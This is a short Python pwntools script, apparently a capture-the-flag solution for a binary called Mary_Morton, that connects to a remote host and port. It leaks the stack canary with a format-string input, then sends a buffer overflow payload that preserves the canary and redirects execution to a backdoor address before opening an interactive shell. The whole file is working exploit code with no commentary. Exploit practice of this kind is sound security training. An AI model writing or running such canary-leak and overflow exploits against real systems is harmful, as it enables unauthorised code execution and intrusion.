#!/usr/bin/python
#coding=utf-8
from pwn import *
#import re

context(arch='amd64',os='linux',log_level='debug')
elf=ELF('./Mary_Morton')
#p=process('./Mary_Morton')
p=remote('220.249.52.133','52935')

p.sendlineafter('3. Exit the battle','2')
#payload='%'+str(0x88/0x08+(0x07-0x01))+'$p'
#p.sendline(payload)
#pause(3)
#raw=p.recv()
#canary=int(re.search(b'0x[0-9a-f]{16}',raw).group(),16)
p.sendline('%23$p')
p.recvuntil('0x')

canary=int(p.recv(16),16)
#canary_str=p.recv(18)[2:18]
#canary=int(canary_str,16)
print(canary)


backdoor_addr=0x4008da
payload=0x88*'a'+p64(canary)+8*'a'+p64(backdoor_addr)

p.sendlineafter('3. Exit the battle','1')
p.sendline(payload)
p.interactive()
p.close()
